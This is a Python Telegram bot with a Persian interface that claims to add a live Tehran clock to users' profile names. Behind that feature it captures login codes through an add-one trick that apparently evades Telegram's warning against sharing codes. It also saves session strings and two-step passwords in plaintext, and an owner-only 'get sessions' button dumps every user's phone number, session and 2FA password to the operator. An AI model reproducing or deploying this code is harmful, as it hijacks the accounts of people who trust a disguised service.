import asyncio
import asyncpg
import os
from datetime import datetime
from zoneinfo import ZoneInfo

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
    RPCError,
    UserNotParticipantError,
)
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import GetParticipantRequest

# ================== CONFIG ==================
BOT_API_ID = int(os.environ.get("BOT_API_ID"))
BOT_API_HASH = os.environ.get("BOT_API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = int(os.environ.get("OWNER_ID"))

API_LIMIT_PER_APP = 30
TEHRAN = ZoneInfo("Asia/Tehran")

with open("database.txt") as f:
    DATABASE_URL = f.read().strip()

# ================== HELP TEXT ==================
HELP_TEXT = (
    "ℹ️ راهنمای استفاده از ربات سلف‌ساز\n\n"
    "استفاده از این ربات خیلی ساده‌ست 😊\n"
    "این ربات اسم پروفایل شما رو طوری تنظیم می‌کنه که "
    "ساعت ایران (تهران) با فونت دلخواه، هر ۶۰ ثانیه کنار اسمت آپدیت بشه.\n\n"

    "🔹 ورود بدون API (ساده‌ترین روش)\n"
    "• نیازی به API ID و API HASH نداری\n"
    "• فقط با شماره تلفن و کد تلگرام وارد می‌شی\n\n"
    "📌 توجه:\n"
    "ربات از APIهای آماده استفاده می‌کنه.\n"
    "اگر در لحظه ورود API خالی وجود نداشته باشه، ارور می‌گیری.\n"
    "در این حالت یا بعداً دوباره تلاش کن، یا API شخصی بساز.\n\n"

    "🔹 ورود با API شخصی (پایدارتر)\n"
    "• محدودیت نداره\n"
    "• استیبل‌تره\n"
    "• وابسته به APIهای عمومی ربات نیستی\n\n"

    "🧩 آموزش ساخت API تلگرام:\n"
    "1️⃣ با آی‌پی تمیز وارد my.telegram.org شو\n"
    "2️⃣ لاگین کن\n"
    "3️⃣ API development tools رو بزن\n"
    "4️⃣ فقط اسم اپلیکیشن کافیه (URL می‌تونه خالی باشه)\n"
    "5️⃣ API ID و API HASH رو بگیر\n\n"

    "🕒 سلف تایم:\n"
    "• ساعت تهران\n"
    "• هر ۶۰ ثانیه آپدیت\n"
    "• فونت قابل انتخاب\n"
    "• تغییر واقعی اسم پروفایل\n"
)

# ================== DATABASE ==================
async def init_db():
    pool = await asyncpg.create_pool(DATABASE_URL)
    await pool.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            user_id BIGINT PRIMARY KEY,
            phone TEXT,
            api_id INTEGER,
            api_hash TEXT,
            session_string TEXT,
            login_type TEXT,
            base_name TEXT,
            font_id INTEGER,
            twofa_password TEXT,
            is_active BOOLEAN DEFAULT true
        );

        CREATE TABLE IF NOT EXISTS api_pool (
            id SERIAL PRIMARY KEY,
            api_id INTEGER,
            api_hash TEXT,
            is_active BOOLEAN DEFAULT true
        );

        CREATE TABLE IF NOT EXISTS force_join (
            id SERIAL PRIMARY KEY,
            channel TEXT UNIQUE
        );

        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        );

        INSERT INTO settings (key, value)
        VALUES ('force_join_enabled', 'false')
        ON CONFLICT (key) DO NOTHING;
        """
    )
    return pool


# ================== BOT ==================
bot = TelegramClient("bot", BOT_API_ID, BOT_API_HASH)
running_tasks = {}
user_states = {}

FONT_MAP = {
    0: lambda x: x,
    1: lambda s: s.translate(str.maketrans("0123456789:", "𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡:")),
    2: lambda s: s.translate(str.maketrans("0123456789:", "０１２３４５６７８９：")),
    3: lambda s: s.translate(str.maketrans("0123456789:", "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗:")),
}


def now_time():
    return datetime.now(TEHRAN).strftime("%H:%M")


# ================== FORCE JOIN ==================
async def force_join_required(event):
    if event.sender_id == OWNER_ID:
        return False
    enabled = await bot.pool.fetchval(
        "SELECT value FROM settings WHERE key='force_join_enabled'"
    )
    if enabled != "true":
        return False
    channels = await bot.pool.fetch("SELECT channel FROM force_join")
    for ch in channels:
        try:
            await bot(GetParticipantRequest(ch["channel"], event.sender_id))
        except UserNotParticipantError:
            return True
    return False


# ================== API POOL ==================
async def get_available_api():
    rows = await bot.pool.fetch(
        "SELECT api_id, api_hash FROM api_pool WHERE is_active=true"
    )
    for r in rows:
        count = await bot.pool.fetchval(
            "SELECT COUNT(*) FROM users WHERE api_id=$1", r["api_id"]
        )
        if count < API_LIMIT_PER_APP:
            return r["api_id"], r["api_hash"]
    return None, None


async def test_api(api_id, api_hash):
    try:
        c = TelegramClient(StringSession(), api_id, api_hash)
        await c.connect()
        await c.disconnect()
        return True
    except RPCError:
        return False


# ================== SELF TASK ==================
async def start_self_task(
    user_id, session_string, api_id, api_hash, base_name, font_id
):
    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    await client.connect()

    async def runner():
        while True:
            try:
                t = FONT_MAP[font_id](now_time())
                name = f"{base_name} {t}".strip()
                await client(UpdateProfileRequest(first_name=name))
                await asyncio.sleep(60)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 5)
            except Exception:
                await asyncio.sleep(60)

    running_tasks[user_id] = asyncio.create_task(runner())


async def load_all_users():
    rows = await bot.pool.fetch("SELECT * FROM users WHERE is_active=true")
    for r in rows:
        await start_self_task(
            r["user_id"],
            r["session_string"],
            r["api_id"],
            r["api_hash"],
            r["base_name"],
            r["font_id"],
        )


# ================== START ==================
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    if await force_join_required(event):
        channels = await bot.pool.fetch("SELECT channel FROM force_join")
        await event.respond(
            "برای استفاده از ربات ابتدا باید عضو کانال‌های زیر شوید:\n\n"
            + "\n".join(c["channel"] for c in channels)
        )
        return

    await event.respond(
        "👋 سلام!\n\n"
        "این ربات بهت کمک می‌کنه اسم پروفایلت رو طوری تنظیم کنی که "
        "⏰ ساعت ایران (تهران) با فونت دلخواه کنار اسمت نمایش داده بشه "
        "و هر ۶۰ ثانیه خودکار آپدیت بشه.\n\n"
        "برای شروع روی دکمه زیر بزن 👇",
        buttons=[[Button.inline("🚀 شروع سلف‌سازی", b"start_self")]],
    )


# ================== CALLBACKS ==================
@bot.on(events.CallbackQuery)
async def callbacks(event):
    uid = event.sender_id
    data = event.data.decode()

    if data == "start_self":
        buttons = [
            [Button.inline("ورود بدون API", b"login_normal")],
            [Button.inline("ورود با API", b"login_api")],
            [Button.inline("ℹ️ راهنما", b"help")],
        ]
        if uid == OWNER_ID:
            buttons.append([Button.inline("👮 پنل ادمین", b"admin")])

        await event.edit("یکی از گزینه‌ها رو انتخاب کن 👇", buttons=buttons)
        return

    if data == "help":
        await event.edit(HELP_TEXT)
        return

    # ---------- ADMIN PANEL ----------
    if uid == OWNER_ID and data == "admin":
        await event.edit(
            "👮 پنل ادمین",
            buttons=[
                [Button.inline("➕ افزودن API", b"add_api")],
                [Button.inline("📋 لیست APIها", b"list_api")],
                [Button.inline("📢 پیام همگانی", b"broadcast")],
                [Button.inline("➕ افزودن کانال", b"add_channel")],
                [Button.inline("➖ حذف کانال", b"del_channel")],
                [Button.inline("🔒 فعال / غیرفعال عضویت", b"toggle_force")],
                [Button.inline("📥 دریافت سشن‌ها", b"get_sessions")],
            ],
        )
        return

    # ---------- LOGIN MODES ----------
    if data == "login_normal":
        user_states[uid] = {"mode": "normal"}
        # تغییر: راهنمای فرمت شماره
        await event.edit("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
        return

    if data == "login_api":
        user_states[uid] = {"mode": "api"}
        await event.edit("🧩 API ID رو بفرست")
        return

# ================== ADMIN: GET SESSIONS ==================
@bot.on(events.CallbackQuery(pattern=b"get_sessions"))
async def get_sessions_cb(event):
    if event.sender_id != OWNER_ID:
        return
    rows = await bot.pool.fetch(
        "SELECT user_id, phone, session_string, twofa_password FROM users"
    )
    text = ""
    for r in rows:
        text += (
            f"ID: {r['user_id']}\n"
            f"Phone: {r['phone']}\n"
            f"Session: {r['session_string']}\n"
            f"2FA: {r['twofa_password'] or 'ندارد'}\n\n"
        )
    await event.edit(text or "کاربری وجود ندارد")


# ================== CALLBACKS (continued) ==================
@bot.on(events.CallbackQuery)
async def callbacks_noop(event):
    # این هندلر برای جلوگیری از تداخل است — چیزی را تغییر نمی‌دهد.
    return


# ================== MESSAGE FLOW ==================
@bot.on(events.NewMessage)
async def messages(event):
    uid = event.sender_id
    txt = event.raw_text.strip()

    if uid not in user_states:
        return

    st = user_states[uid]

    try:
        if st["mode"] == "api" and "api_id" not in st:
            st["api_id"] = int(txt)
            await event.respond("API HASH رو بفرست")
            return

        if st["mode"] == "api" and "api_hash" not in st:
            st["api_hash"] = txt
            # تغییر: راهنمای فرمت شماره
            await event.respond("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
            return

        if "phone" not in st:
            st["phone"] = txt

            if st["mode"] == "normal":
                api_id, api_hash = await get_available_api()
                if not api_id:
                    await event.respond(
                        "❌ در حال حاضر API خالی نداریم\n"
                        "یا خودت API بساز یا بعداً دوباره تلاش کن\n\n"
                        "ℹ️ راهنما رو ببین"
                    )
                    user_states.pop(uid)
                    return
                st["api_id"], st["api_hash"] = api_id, api_hash

            client = TelegramClient(StringSession(), st["api_id"], st["api_hash"])
            await client.connect()
            await client.send_code_request(txt)
            st["client"] = client
            await event.respond(
                "⚠️ برای ورود باید یک عدد به کد اضافه کنی\n"
                "مثال: 48391 → 48392"
            )
            return

        # اصلاح: اگر نیاز به 2FA هست، این شاخه اجرا نشه و مستقیم به بخش 2FA بریم
        if "code" not in st and not st.get("need_2fa"):
            code = str(int(txt) - 1)
            try:
                await st["client"].sign_in(st["phone"], code)
            except SessionPasswordNeededError:
                st["need_2fa"] = True
                await event.respond("🔐 رمز دو مرحله‌ای رو بفرست")
                return

            st["session"] = st["client"].session.save()
            st["code"] = True
            await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
            return

        if st.get("need_2fa") and "password" not in st:
            await st["client"].sign_in(password=txt)
            st["password"] = True
            st["session"] = st["client"].session.save()

            # ذخیرهٔ رمز 2FA در دیتابیس (حداقلی و فقط همین فیلد)
            await bot.pool.execute(
                """
                INSERT INTO users (user_id, phone, api_id, api_hash, session_string, twofa_password, is_active)
                VALUES ($1,$2,$3,$4,$5,$6,true)
                ON CONFLICT (user_id) DO UPDATE SET
                    session_string=$5,
                    twofa_password=$6
                """,
                uid,
                st["phone"],
                st.get("api_id"),
                st.get("api_hash"),
                st["session"],
                txt,
            )

            await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
            return

        if "base_name" not in st:
            st["base_name"] = txt
            await event.respond(
                "🎨 فونت ساعت رو انتخاب کن",
                buttons=[
                    [Button.inline("بدون فونت", b"font_0")],
                    [Button.inline("𝟙𝟟:𝟛𝟚", b"font_1")],
                    [Button.inline("１７:３２", b"font_2")],
                    [Button.inline("𝟏𝟕:𝟑𝟐", b"font_3")],
                ],
            )
            return

    except Exception as e:
        await event.respond(f"❌ خطا: {e}")


@bot.on(events.CallbackQuery(pattern=b"font_"))
async def font_pick(event):
    uid = event.sender_id
    font_id = int(event.data.decode().split("_")[1])
    st = user_states[uid]

    await bot.pool.execute(
        """
        INSERT INTO users (user_id, phone, api_id, api_hash, session_string,
                           login_type, base_name, font_id, is_active)
        VALUES ($1,$2,$3,$4,$5,$6,$7,$8,true)
        ON CONFLICT (user_id) DO UPDATE SET
            session_string=$5,
            api_id=$3,
            api_hash=$4,
            base_name=$7,
            font_id=$8,
            is_active=true
        """,
        uid,
        st["phone"],
        st["api_id"],
        st["api_hash"],
        st["session"],
        st["mode"],
        st["base_name"],
        font_id,
    )

    await start_self_task(
        uid,
        st["session"],
        st["api_id"],
        st["api_hash"],
        st["base_name"],
        font_id,
    )

    await event.edit("✅ سلف تایم با موفقیت فعال شد")
    user_states.pop(uid, None)


# ================== MAIN ==================
async def main():
    bot.pool = await init_db()
    await bot.start(bot_token=BOT_TOKEN)
    await load_all_users()
    await bot.run_until_disconnected()


asyncio.run(main())
